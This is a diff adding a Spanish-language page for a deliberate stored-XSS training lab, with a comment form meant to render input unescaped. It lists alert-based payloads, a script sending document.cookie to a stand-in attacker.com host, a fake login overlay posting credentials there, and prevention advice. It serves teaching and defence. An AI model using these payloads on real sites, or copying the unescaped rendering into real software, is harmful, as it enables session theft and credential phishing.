@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ejercicio 2: Stored XSS</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <a href="/" class="logo">🔍 LAB XSS</a>
+            <nav>
+                <ul class="nav">
+                    <li><a href="/">← Volver al Inicio</a></li>
+                    <li><a href="/users">👥 Usuarios</a></li>
+                    <li><a href="/about">ℹ️ Acerca de</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <h1 class="page-title">💾 Ejercicio 2: Stored XSS</h1>
+        <p class="page-subtitle">Inyecta código malicioso que persiste y afecta a todos los usuarios</p>
+
+        <!-- Instructions -->
+        <div class="info-box">
+            <div class="info-title">📋 Instrucciones</div>
+            <p>Este sistema de comentarios es vulnerable a Stored XSS. Tu objetivo es inyectar código JavaScript que se almacene en la base de datos y se ejecute cada vez que alguien visite esta página.</p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #00d9ff;">Objetivo:</strong> Almacenar código malicioso en la base de datos</li>
+                <li><strong style="color: #00d9ff;">Tipo:</strong> Stored/Persistent XSS (persiste entre sesiones)</li>
+                <li><strong style="color: #00d9ff;">Vulnerabilidad:</strong> Los comentarios se guardan y muestran sin sanitizar</li>
+                <li><strong style="color: #00d9ff;">Impacto:</strong> Afecta a TODOS los usuarios que vean la página</li>
+            </ul>
+        </div>
+
+        <!-- Payloads Sugeridos -->
+        <div class="info-box success">
+            <div class="info-title">💡 Payloads Sugeridos</div>
+            <div style="margin-top: 1rem;">
+                <p style="color: #8b949e; margin-bottom: 0.5rem;">Prueba estos payloads en el campo de comentario:</p>
+                <div class="code-block">
+                    <code>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;img src=x onerror=alert('Stored XSS!')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg onload=alert('Persistent XSS')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;iframe src="javascript:alert('XSS')"&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;input onfocus=alert('XSS') autofocus&gt;</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Comment Form -->
+        <div class="search-box">
+            <h2 style="color: #00d9ff; margin-bottom: 1.5rem;">💬 Dejar un Comentario</h2>
+            <form method="POST" action="/stored">
+                <div class="form-group">
+                    <label class="form-label">Tu nombre:</label>
+                    <input type="text" name="nombre" class="form-input" 
+                           placeholder="Ej: Juan Pérez" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Comentario:</label>
+                    <textarea name="comentario" class="form-textarea" 
+                              placeholder="Escribe tu comentario aquí..." required></textarea>
+                </div>
+                <button type="submit" class="btn">Publicar Comentario</button>
+                <form method="POST" action="/stored/clear" style="display: inline; margin-left: 1rem;">
+                    <button type="submit" class="btn btn-danger">🗑️ Limpiar Comentarios</button>
+                </form>
+            </form>
+        </div>
+
+        <!-- Comments Section -->
+        <div class="comments-section">
+            <h2 style="color: #00d9ff; margin-bottom: 1.5rem;">💬 Comentarios ({{ comentarios|length }})</h2>
+            
+            {% if comentarios %}
+                {% for comentario in comentarios %}
+                <div class="comment-card">
+                    <div class="comment-header">
+                        <span class="comment-author">{{ comentario.nombre }}</span>
+                        <span class="comment-date">{{ comentario.created_at }}</span>
+                    </div>
+                    <div class="comment-body">
+                        <!-- ⚠️ VULNERABLE: Renderizando comentario sin escape -->
+                        {{ comentario.comentario }}
+                    </div>
+                </div>
+                {% endfor %}
+            {% else %}
+                <div class="info-box">
+                    <p>No hay comentarios todavía. ¡Sé el primero en comentar!</p>
+                </div>
+            {% endif %}
+        </div>
+
+        <!-- Educational Info -->
+        <div class="info-box warning" style="margin-top: 3rem;">
+            <div class="info-title">🎓 Explicación Técnica</div>
+            <p><strong>¿Por qué es más peligroso que Reflected XSS?</strong></p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong>Persistencia:</strong> El código malicioso se almacena en la base de datos</li>
+                <li><strong>Alcance masivo:</strong> Afecta a todos los usuarios que visiten la página</li>
+                <li><strong>Sin interacción necesaria:</strong> Las víctimas no necesitan hacer clic en un link</li>
+                <li><strong>Difícil de detectar:</strong> El payload permanece activo hasta ser eliminado</li>
+            </ul>
+            <p style="margin-top: 1rem;"><strong>Ataques posibles:</strong></p>
+            <ul style="margin-top: 0.5rem; margin-left: 2rem; color: #8b949e;">
+                <li>Robar cookies de sesión de múltiples usuarios</li>
+                <li>Defacement (modificar la apariencia del sitio)</li>
+                <li>Phishing interno (formularios falsos de login)</li>
+                <li>Propagación de malware</li>
+                <li>Cryptojacking (minería de criptomonedas)</li>
+            </ul>
+        </div>
+
+        <!-- Advanced Payloads -->
+        <div class="info-box" style="margin-top: 2rem;">
+            <div class="info-title">🚀 Payloads Avanzados</div>
+            <p>Una vez que domines los básicos, prueba estos:</p>
+            <div class="code-block" style="margin-top: 1rem;">
+                <code>// Robar cookies y enviarlas a un servidor externo (simulado)
+&lt;script&gt;
+fetch('https://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code>
+            </div>
+            <div class="code-block">
+                <code>// Crear un formulario de phishing
+&lt;div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999"&gt;
+  &lt;h1&gt;Sesión Expirada&lt;/h1&gt;
+  &lt;form action="https://attacker.com/phish"&gt;
+    &lt;input name="user" placeholder="Usuario"&gt;
+    &lt;input name="pass" type="password" placeholder="Contraseña"&gt;
+    &lt;button&gt;Iniciar Sesión&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/div&gt;</code>
+            </div>
+        </div>
+
+        <!-- Defense -->
+        <div class="info-box danger" style="margin-top: 2rem;">
+            <div class="info-title">🛡️ ¿Cómo Prevenir Stored XSS?</div>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #ff4444;">Sanitización en entrada:</strong> Limpiar el input antes de almacenarlo</li>
+                <li><strong style="color: #ff4444;">Escape en salida:</strong> Escapar HTML al mostrar contenido almacenado</li>
+                <li><strong style="color: #ff4444;">Content Security Policy:</strong> Restricciones estrictas de ejecución de scripts</li>
+                <li><strong style="color: #ff4444;">HTTPOnly cookies:</strong> Prevenir acceso a cookies desde JavaScript</li>
+                <li><strong style="color: #ff4444;">Validación de tipos:</strong> Usar bibliotecas como DOMPurify para sanitizar HTML</li>
+                <li><strong style="color: #ff4444;">WAF:</strong> Web Application Firewall para detectar patrones XSS</li>
+            </ul>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>🔐 Ejercicio 2: Stored XSS | <a href="/" style="color: #00d9ff;">Volver al menú principal</a></p>
+    </footer>
+
+    <script>
+        // Mensaje educativo en consola
+        console.log('%c💾 Ejercicio 2: Stored XSS', 'color: #00ff41; font-size: 18px; font-weight: bold;');
+        console.log('%cEsta página es vulnerable a Stored/Persistent XSS', 'color: #ffaa00; font-size: 12px;');
+        console.log('%c⚠️  Los comentarios se almacenan SIN sanitizar en la base de datos', 'color: #ff4444; font-size: 12px;');
+        
+        // Contar comentarios potencialmente maliciosos
+        const comments = document.querySelectorAll('.comment-body');
+        let suspiciousCount = 0;
+        comments.forEach(comment => {
+            const text = comment.textContent || comment.innerText;
+            if (text.includes('<script>') || text.includes('onerror') || text.includes('onload')) {
+                suspiciousCount++;
+            }
+        });
+        
+        if (suspiciousCount > 0) {
+            console.log(`%c⚠️  Se detectaron ${suspiciousCount} comentarios con posible código malicioso`, 'color: #ffaa00; font-size: 12px;');
+        }
+
+        // Override alert para mostrar mensaje educativo
+        const originalAlert = window.alert;
+        window.alert = function(message) {
+            console.log('%c🎉 ¡STORED XSS EXITOSO!', 'color: #00ff41; font-size: 20px; font-weight: bold;');
+            console.log('%c✓ Has almacenado código malicioso en la base de datos', 'color: #00ff41; font-size: 14px;');
+            console.log('%c⚠️  Este código se ejecutará para TODOS los usuarios que vean esta página', 'color: #ff4444; font-size: 12px;');
+            console.log('%c💡 Recarga la página y verás que el XSS persiste', 'color: #00d9ff; font-size: 12px;');
+            originalAlert('✅ ¡STORED XSS EXITOSO!\n\n' + message + '\n\n¡Felicitaciones! Este payload ahora afecta a todos los usuarios.\n\nRecarga la página para ver que persiste.');
+        };
+    </script>
+</body>
+</html>
